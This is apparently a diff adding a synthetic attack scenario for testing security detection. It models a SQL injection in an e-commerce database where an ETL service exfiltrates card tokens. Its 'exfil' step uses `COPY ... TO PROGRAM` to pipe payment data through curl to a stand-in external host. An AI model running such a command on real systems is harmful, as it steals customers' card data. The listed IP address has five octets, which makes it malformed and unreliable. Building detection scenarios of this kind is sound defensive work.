@@ -1,0 +1,32 @@
+scenario_id: gen_ecommerce_89_sql_injection_mal_2701m
+family_id: gen_ecommerce_89_sql_injection_fam_2701
+domain: ecommerce
+time_of_day: 01:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: inject
+  role: analytics_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: probe
+    sql: SELECT card_token, card_last4 FROM payments WHERE order_id > 883719
+  - step_id: exfil
+    sql: COPY (SELECT card_token, card_last4 FROM payments) TO PROGRAM 'curl -sX POST
+      https://warehouse-sync.datasink.example/ingest -d @-'
+    connects_to:
+      ip: 23.129.64.84.242
+      port: 8080
+matched_pair_id: gen_ecommerce_89_sql_injection_pair_2701
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
